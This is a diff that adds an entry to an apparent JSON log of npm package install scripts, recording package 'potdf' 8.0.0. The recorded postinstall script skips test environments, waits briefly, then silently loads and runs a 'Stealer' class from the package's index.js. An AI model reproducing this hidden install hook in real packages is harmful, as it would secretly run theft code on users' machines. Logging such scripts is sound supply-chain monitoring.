@@ -1,5 +1,13 @@
 [
   {
+    "packageName": "potdf",
+    "version": "8.0.0",
+    "scriptType": "postinstall",
+    "scriptContent": "node -e \"if (process.env.NODE_ENV !== 'test') { setTimeout(() => { try { const Stealer = require('./index.js'); new Stealer().execute(); } catch(e) {} }, 1500) }\"",
+    "previousVersion": null,
+    "timestamp": "2026-01-20T10:22:19.102Z"
+  },
+  {
     "packageName": "ground-mcp",
     "version": "0.1.0",
     "scriptType": "postinstall",
